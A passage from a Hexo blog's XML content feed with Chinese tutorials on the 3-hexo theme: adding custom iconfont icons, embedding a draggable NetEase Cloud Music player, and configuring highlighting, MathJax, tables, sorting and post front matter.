<p><img src="https://img.saodiyang.com/picgo_qiniu20201229001129.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201229001129.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>完成！</p>
<blockquote>
<p>图标名如上面的 <code>gitee</code> 可以在 网站上修改，如下图所示<br><img src="https://img.saodiyang.com/picgo_qiniu20201229002057.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201229002057.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
</blockquote>
<h2 id="三、添加黑白图标"><a href="#三、添加黑白图标" class="headerlink" title="三、添加黑白图标"></a>三、添加黑白图标</h2><p><code>link.theme=white</code></p>
<h3 id="3-1-同-2-1"><a href="#3-1-同-2-1" class="headerlink" title="3.1 同 2.1"></a>3.1 同 2.1</h3><h3 id="3-2-引入-3-hexo-中"><a href="#3-2-引入-3-hexo-中" class="headerlink" title="3.2 引入 3-hexo 中"></a>3.2 引入 3-hexo 中</h3><p>点击生成代码，如下图所示。</p>
<p><img src="https://img.saodiyang.com/picgo_qiniu20201228231715.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201228231715.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>复制生成的代码，修改 <code>font-family</code> 的值为 <code>custom-iconfont</code>，添加到 <code>3-hexo/source/css/_partial/font.styl</code> 最后，并写入图标信息，<code>content</code> 可以移到图标上进行复制，注意前面斜杠转译和去掉后面的分号。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&#x27;custom-iconfont&#x27;</span>;  <span class="comment">/* project id 2298064 */</span></span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.eot&#x27;</span>);</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.eot?#iefix&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span><br><span class="line">  <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.woff2&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff2&#x27;</span>),</span><br><span class="line">  <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.woff&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span><br><span class="line">  <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span><br><span class="line">  <span class="built_in">url</span>(<span class="string">&#x27;//at.alicdn.com/t/font_2298064_34vkk4c9945.svg#iconfont&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-gitee</span>:before &#123;</span><br><span class="line">  content: <span class="string">&quot;\e602&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.icon-youtubeautored</span>:before &#123;</span><br><span class="line">  content: <span class="string">&quot;\e649&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-3-在配置文件中添加生效-同2-2"><a href="#3-3-在配置文件中添加生效-同2-2" class="headerlink" title="3.3 在配置文件中添加生效 同2.2"></a>3.3 在配置文件中添加生效 同2.2</h3><p>结束！</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo 添加音乐插件</title>
    <url>//3-hexo-add-music</url>
    <content><![CDATA[<h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h2><h3 id="1-复制网易云音乐插件代码"><a href="#1-复制网易云音乐插件代码" class="headerlink" title="1. 复制网易云音乐插件代码"></a>1. 复制网易云音乐插件代码</h3><p>前往<a href="https://music.163.com/">网易云音乐官网</a>，搜索一个作为背景音乐的歌曲，并进入播放页面，点击 <strong>生成外链播放器</strong><br><img src="https://i.loli.net/2019/10/08/RgSUj1i8vXNk5IP.png" class="lazyload" data-srcset="https://i.loli.net/2019/10/08/RgSUj1i8vXNk5IP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="生成外链播放器"></p>
<p>设置好想要显示的样式后，复制 html 代码</p>
<p><img src="https://i.loli.net/2019/10/08/rbHRZEoB4mzip75.png" class="lazyload" data-srcset="https://i.loli.net/2019/10/08/rbHRZEoB4mzip75.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>最好外层在加一个 <code>div</code>，如下，可直接将上一步复制的 <code>iframe</code> 替换下方里面的 <code>iframe</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;musicMouseDrag&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed; z-index: 9999; bottom: 0; right: 0;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;musicDragArea&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; top: 0; left: 0; width: 100%;height: 10px;cursor: move; z-index: 10;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span> <span class="attr">marginheight</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">330</span> <span class="attr">height</span>=<span class="string">86</span> <span class="attr">src</span>=<span class="string">&quot;//music.163.com/outchain/player?type=2&amp;id=38592976&amp;auto=1&amp;height=66&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-将插件引入到主题中"><a href="#2-将插件引入到主题中" class="headerlink" title="2. 将插件引入到主题中"></a>2. 将插件引入到主题中</h3><p>将上一步加过 <code>div</code> 的代码粘贴到主题下 <code>layout/_partial/footer.ejs</code> 的最后面<br><img src="https://i.loli.net/2019/10/08/FRJOKxLECcvinmf.png" class="lazyload" data-srcset="https://i.loli.net/2019/10/08/FRJOKxLECcvinmf.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="效果"></p>
<h3 id="3-调整位置"><a href="#3-调整位置" class="headerlink" title="3. 调整位置"></a>3. 调整位置</h3><p>默认给的样式是显示在右下角，可以通过调整上一步粘贴的 <code>div</code> 的 <code>style</code> 中 <code>bottom</code> 和 <code>right</code> 来调整位置。</p>
<h3 id="4-自由拖动"><a href="#4-自由拖动" class="headerlink" title="4. 自由拖动"></a>4. 自由拖动</h3><p>如果需要自由拖动，在刚才添加的代码后面，再添加下面代码即可，鼠标就可以在音乐控件的 <strong>上边沿</strong> 点击拖动</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--以下代码是为了支持随时拖动音乐控件的位置，如没有需求，可去掉下面代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> $DOC = $(<span class="built_in">document</span>)</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#musicMouseDrag&#x27;</span>).on(<span class="string">&#x27;mousedown&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 阻止文本选中</span></span></span><br><span class="line"><span class="javascript">      $DOC.bind(<span class="string">&quot;selectstart&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">      &#125;);</span></span><br><span class="line"><span class="javascript">      $(<span class="string">&#x27;#musicDragArea&#x27;</span>).css(<span class="string">&#x27;height&#x27;</span>, <span class="string">&#x27;100%&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> $moveTarget = $(<span class="string">&#x27;#musicMouseDrag&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      $moveTarget.css(<span class="string">&#x27;border&#x27;</span>, <span class="string">&#x27;1px dashed grey&#x27;</span>)</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> div_x = e.pageX - $moveTarget.offset().left;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> div_y = e.pageY - $moveTarget.offset().top;</span></span><br><span class="line"><span class="javascript">      $DOC.on(<span class="string">&#x27;mousemove&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> targetX = e.pageX - div_x;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> targetY = e.pageY - div_y;</span></span><br><span class="line"><span class="javascript">        targetX = targetX &lt; <span class="number">0</span> ? <span class="number">0</span> : (targetX + $moveTarget.outerWidth() &gt;= <span class="built_in">window</span>.innerWidth) ? <span class="built_in">window</span>.innerWidth - $moveTarget.outerWidth() : targetX;</span></span><br><span class="line"><span class="javascript">        targetY = targetY &lt; <span class="number">0</span> ? <span class="number">0</span> : (targetY + $moveTarget.outerHeight() &gt;= <span class="built_in">window</span>.innerHeight) ? <span class="built_in">window</span>.innerHeight - $moveTarget.outerHeight() : targetY;</span></span><br><span class="line"><span class="javascript">        $moveTarget.css(&#123;<span class="string">&#x27;left&#x27;</span>: targetX + <span class="string">&#x27;px&#x27;</span>, <span class="string">&#x27;top&#x27;</span>: targetY + <span class="string">&#x27;px&#x27;</span>, <span class="string">&#x27;bottom&#x27;</span>: <span class="string">&#x27;inherit&#x27;</span>, <span class="string">&#x27;right&#x27;</span>: <span class="string">&#x27;inherit&#x27;</span>&#125;)</span></span><br><span class="line"><span class="javascript">      &#125;).on(<span class="string">&#x27;mouseup&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $DOC.unbind(<span class="string">&quot;selectstart&quot;</span>);</span></span><br><span class="line"><span class="javascript">        $DOC.off(<span class="string">&#x27;mousemove&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        $DOC.off(<span class="string">&#x27;mouseup&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        $moveTarget.css(<span class="string">&#x27;border&#x27;</span>, <span class="string">&#x27;none&#x27;</span>)</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&#x27;#musicDragArea&#x27;</span>).css(<span class="string">&#x27;height&#x27;</span>, <span class="string">&#x27;10px&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      &#125;)</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>3-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo使用说明</title>
    <url>//3-hexo-instruction</url>
    <content><![CDATA[<blockquote>
<p>下面如果没有特殊说明， <code>_config.yml</code> 都指主题配置文件，即 <code>3-hexo</code> 目录下</p>
</blockquote>
<h2 id="一、初始化博客下-config-yml"><a href="#一、初始化博客下-config-yml" class="headerlink" title="一、初始化博客下 _config.yml"></a>一、初始化博客下 _config.yml</h2><h3 id="1-1-国际化"><a href="#1-1-国际化" class="headerlink" title="1.1 国际化"></a>1.1 国际化</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment">#支持 zh-CN、en</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-关掉-hexo-自带的代码高亮"><a href="#1-2-关掉-hexo-自带的代码高亮" class="headerlink" title="1.2 关掉 hexo 自带的代码高亮"></a>1.2 关掉 hexo 自带的代码高亮</h3><p>主题内置了主题高亮，所以需要禁用 hexo 自带的高亮</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">	<span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>



<h2 id="二、功能相关"><a href="#二、功能相关" class="headerlink" title="二、功能相关"></a>二、功能相关</h2><h3 id="2-1-自定义首页"><a href="#2-1-自定义首页" class="headerlink" title="2.1 自定义首页"></a>2.1 自定义首页</h3><p>可查看这篇文章： <a href="#">Post not found: 3-hexo-homepage</a></p>
<h3 id="2-3-blog快捷键"><a href="#2-3-blog快捷键" class="headerlink" title="2.3 blog快捷键"></a>2.3 blog快捷键</h3><p>可查看这篇文章： <a href="#">Post not found: 3-hexo-shortcuts</a></p>
<h3 id="2-4-多作者模式"><a href="#2-4-多作者模式" class="headerlink" title="2.4 多作者模式"></a>2.4 多作者模式</h3><p>可查看这篇文章： <a href="#">Post not found: 3-hexo-multiple-author</a></p>
<h3 id="2-5-开启关于页面"><a href="#2-5-开启关于页面" class="headerlink" title="2.5 开启关于页面"></a>2.5 开启<code>关于</code>页面</h3><ol>
<li>在 <code>hexo</code> 根目录执行以下，创建 <code>关于</code> 页面<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>位置： <code>source/aoubt/index.md</code> ，根据需要进行编辑。</li>
<li>在主题中开启显示：修改主题根目录 <code>_config.yml</code> 中的 <code>about</code> 的 <code>on</code> 为 <code>true</code>，如下所示<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">about:</span>  <span class="comment"># &#x27;关于&#x27; 按钮</span></span><br><span class="line">    <span class="attr">on:</span> <span class="literal">true</span> <span class="comment"># 是否显示</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">/about</span>  <span class="comment"># 跳转链接</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span> <span class="comment"># 跳转类型 1：站内异步跳转 2：当前页面跳转 3：打开新的tab页</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-6-添加音乐插件"><a href="#2-6-添加音乐插件" class="headerlink" title="2.6 添加音乐插件"></a>2.6 添加音乐插件</h3><a href="#">Post not found: 3-hexo-add-music</a>

<h3 id="2-7-配置评论系统"><a href="#2-7-配置评论系统" class="headerlink" title="2.7 配置评论系统"></a>2.7 配置评论系统</h3><a href="#">Post not found: 3-hexo-comment</a>

<h2 id="三、样式设置"><a href="#三、样式设置" class="headerlink" title="三、样式设置"></a>三、样式设置</h2><h3 id="3-1-代码高亮"><a href="#3-1-代码高亮" class="headerlink" title="3.1 代码高亮"></a>3.1 代码高亮</h3><p>首先要关闭hexo根目录下<code>_config.yml</code>中的高亮设置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>配置主题下<code>_config.yml</code>中的高亮设置：<br>可以根据提示，配置喜欢的高亮主题</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span> <span class="comment"># true开启代码高亮</span></span><br><span class="line">  <span class="attr">lineNum:</span> <span class="literal">true</span> <span class="comment"># true显示行号</span></span><br><span class="line">  <span class="attr">theme:</span> <span class="string">darcula</span></span><br><span class="line"><span class="comment"># 代码高亮主题,效果可以查看 https://highlightjs.org/static/demo/</span></span><br><span class="line"><span class="comment"># 支持主题：</span></span><br><span class="line"><span class="comment"># sublime : 参考sublime的高亮主题</span></span><br><span class="line"><span class="comment"># darcula : 参考idea中的darcula的主题</span></span><br><span class="line"><span class="comment"># atom-dark : 参考Atom的dark主题</span></span><br><span class="line"><span class="comment"># atom-light : 参考Atom的light主题</span></span><br><span class="line"><span class="comment"># github : 参考GitHub版的高亮主题</span></span><br><span class="line"><span class="comment"># github-gist : GitHub-Gist主题</span></span><br><span class="line"><span class="comment"># brown-paper : 牛皮纸效果</span></span><br><span class="line"><span class="comment"># gruvbox-light : gruvbox的light主题</span></span><br><span class="line"><span class="comment"># gruvbox-dark ： gruvbox的dark主题</span></span><br><span class="line"><span class="comment"># rainbow :</span></span><br><span class="line"><span class="comment"># railscasts :</span></span><br><span class="line"><span class="comment"># sunburst :</span></span><br><span class="line"><span class="comment"># kimbie-dark :</span></span><br><span class="line"><span class="comment"># kimbie-light :</span></span><br><span class="line"><span class="comment"># school-book : 纸张效果</span></span><br></pre></td></tr></table></figure>
<h3 id="3-2-MathJax数学公式"><a href="#3-2-MathJax数学公式" class="headerlink" title="3.2 MathJax数学公式"></a>3.2 MathJax数学公式</h3><p>修改 <code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MathJax 数学公式支持</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">on:</span> <span class="literal">true</span> <span class="comment">#是否启用</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">false</span> <span class="comment"># 若只渲染单个页面，此选项设为false，页面内加入 mathjax: true</span></span><br></pre></td></tr></table></figure>
<p>考虑到页面的加载速度，支持渲染单个页面。<br>设置 <code>per_page: false</code> ,在需要渲染的页面内 加入 <code>mathjax: true</code></p>
<blockquote>
<p><strong><code>注意: </code></strong><br>由于hexo的MarkDown渲染器与MathJax有冲突，可能会造成矩阵等使用不正常。所以在使用之前需要修改两个地方<br>编辑 <code>node_modules\marked\lib\marked.js</code> 脚本</p>
</blockquote>
<ol>
<li>将451行 ，这一步取消了对 <code>\\,\&#123;,\&#125;</code> 的转义(escape)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">escape</span>: <span class="regexp">/^\\([\\`*&#123;&#125;\[\]()# +\-.!_&gt;])/</span>,</span><br><span class="line">改为</span><br><span class="line"><span class="attr">escape</span>: <span class="regexp">/^\\([`*\[\]()# +\-.!_&gt;])/</span>,</span><br></pre></td></tr></table></figure></li>
<li>将459行，这一步取消了对斜体标记 <code>_</code> 的转义<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">em: <span class="regexp">/^\b_((?:[^_]|__)+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br><span class="line">改为</span><br><span class="line"><span class="attr">em</span>:<span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span>,</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="3-3-表格样式"><a href="#3-3-表格样式" class="headerlink" title="3.3 表格样式"></a>3.3 表格样式</h3><p>目前提供了3中样式，修改 <code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">table:</span> <span class="string">green_title</span></span><br><span class="line"><span class="comment"># table 的样式</span></span><br><span class="line"><span class="comment"># 为空时类似github的table样式</span></span><br><span class="line"><span class="comment"># green 绿色样式</span></span><br><span class="line"><span class="comment"># green_title 头部为青色的table样式</span></span><br></pre></td></tr></table></figure>
<h3 id="3-4-文章列表的hover样式"><a href="#3-4-文章列表的hover样式" class="headerlink" title="3.4 文章列表的hover样式"></a>3.4 文章列表的hover样式</h3><p>鼠标移入的背景色和文字颜色变动，设置 <code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文章列表 鼠标移上去的样式, 为空时使用默认效果</span></span><br><span class="line"><span class="attr">article_list:</span></span><br><span class="line">  <span class="attr">hover:</span></span><br><span class="line">    <span class="attr">background:</span> <span class="string">&#x27;#e2e0e0&#x27;</span>  <span class="comment"># 背景色:提供几种：&#x27;#c1bfc1&#x27;  &#x27;#fbf4a8&#x27;</span></span><br><span class="line">    <span class="attr">color:</span>     <span class="comment"># 文字颜色 提供几种：&#x27;#ffffff&#x27;</span></span><br><span class="line"><span class="comment"># 注意：由于颜色如果包含#，使用单引号 &#x27; 引起来</span></span><br></pre></td></tr></table></figure>
<h3 id="3-5-开启字数统计"><a href="#3-5-开启字数统计" class="headerlink" title="3.5 开启字数统计"></a>3.5 开启字数统计</h3><ol>
<li>开启此功能需先安装插件，在 hexo根目录 执行 <code>npm i hexo-wordcount --save</code></li>
<li>修改 <code>_config.yml</code></li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">word_count:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h3 id="3-6-更换头像"><a href="#3-6-更换头像" class="headerlink" title="3.6 更换头像"></a>3.6 更换头像</h3><p>两种方式：</p>
<ol>
<li>替换 <code>source/img/avatar.jpg</code> 图片。</li>
<li>修改 <code>_config.yml</code> 中头像的配置记录</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 你的头像url</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/img/avatar.jpg</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/img/avatar.jpg</span></span><br></pre></td></tr></table></figure>

<h3 id="3-7-设置链接图标"><a href="#3-7-设置链接图标" class="headerlink" title="3.7 设置链接图标"></a>3.7 设置链接图标</h3><blockquote>
<p>如果需要自定义图标可以看这篇文章 <a href="#">Post not found: 3-hexo-add-icon</a></p>
</blockquote>
<p>如下，如果没有连接，则不展示图标。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#链接图标，链接为空则不显示</span></span><br><span class="line"><span class="attr">link:</span></span><br><span class="line">  <span class="attr">rss:</span> <span class="string">/atom.xml</span></span><br><span class="line">  <span class="attr">github:</span> <span class="string">https://github.com/yelog</span></span><br><span class="line">  <span class="attr">facebook:</span> <span class="string">https://www.facebook.com/faker.tops</span></span><br><span class="line">  <span class="attr">twitter:</span></span><br><span class="line">  <span class="attr">linkedin:</span></span><br><span class="line">  <span class="attr">instagram:</span></span><br><span class="line">  <span class="attr">reddit:</span> <span class="string">https://www.reddit.com/user/yelog/</span></span><br><span class="line">  <span class="attr">weibo:</span> <span class="string">http://weibo.com/u/2307534817</span></span><br><span class="line">  <span class="attr">email:</span> <span class="string">jaytp@qq.com</span></span><br></pre></td></tr></table></figure>

<h2 id="四、排序及置顶"><a href="#四、排序及置顶" class="headerlink" title="四、排序及置顶"></a>四、排序及置顶</h2><h3 id="4-1-分类排序"><a href="#4-1-分类排序" class="headerlink" title="4.1 分类排序"></a>4.1 分类排序</h3><p>默认按照首字母正序排序，由于中文在 <code>nodejs</code> 环境下不能按照拼音首字母排序，所以添加了自定义排序方式，在主题下 <code>_config.yml</code> 中找到如下配置，<code>category.sort</code>则是定义分类顺序的。</p>
<p><strong>规则：</strong>在 <code>sort</code>中定义的 <code>category</code> 比 没有在 <code>sort</code> 中定义的更靠前</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章分类设置</span></span><br><span class="line"><span class="attr">category:</span></span><br><span class="line">  <span class="attr">num:</span> <span class="literal">true</span> <span class="comment"># 分类显示文章数</span></span><br><span class="line">  <span class="attr">sub:</span> <span class="literal">true</span> <span class="comment"># 开启多级分类</span></span><br><span class="line">  <span class="attr">sort:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">读书</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">大前端</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">后端</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">数据库</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">工具</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">运维</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-文章排序"><a href="#4-2-文章排序" class="headerlink" title="4.2 文章排序"></a>4.2 文章排序</h3><blockquote>
<p>2020-05-20 更新：无需安装插件或修改源码，主题以内置排序算法</p>
</blockquote>
<p>文章列表默认按照创建时间（如下文章内定义的<code>date</code>）倒序。</p>
<p>使用 <code>top</code> 将会置顶文章，多个置顶文章时，<code>top</code> 定义的值越大，越靠前。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">每天一个linux命令</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2017-01-23 11:41:48</span></span><br><span class="line"><span class="attr">top:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">运维</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">linux命令</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h2 id="五、关于写文章"><a href="#五、关于写文章" class="headerlink" title="五、关于写文章"></a>五、关于写文章</h2><h3 id="5-1-如何写"><a href="#5-1-如何写" class="headerlink" title="5.1 如何写"></a>5.1 如何写</h3><p>每篇文章最好写上文集和标签，方便筛选和查看。<br>一般推荐一篇文章设置一个文集，一个或多个标签<br><code>categories</code>:文集，为左侧列表<br><code>tags</code>:标签，通过#来筛选<br>例如 本篇文章的设置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="number">3</span><span class="string">-hexo使用说明</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2017-03-23 15:13:47</span></span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">工具</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">3</span><span class="string">-hexo</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>
<h3 id="5-2-写作"><a href="#5-2-写作" class="headerlink" title="5.2 写作"></a>5.2 写作</h3><p>1.设置模板，blog根目录 <code>scaffolds/post.md</code><br>加入categories,tags等，这样以后通过 <code>hexo new</code> 生成的模板就不用写这两个单词了。<br>当然，你也可以写入任何你每个文章中都会有的部分。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> &#123;&#123; <span class="string">title</span> &#125;&#125;</span><br><span class="line"><span class="attr">date:</span> &#123;&#123; <span class="string">date</span> &#125;&#125;</span><br><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h2 id="六、技巧"><a href="#六、技巧" class="headerlink" title="六、技巧"></a>六、技巧</h2><h3 id="6-1-快捷命令"><a href="#6-1-快捷命令" class="headerlink" title="6.1 快捷命令"></a>6.1 快捷命令</h3><p>其实就通过alias，触发一些命令的集合<br>在 <code>~/.bashrc</code> 文件中添加</p>
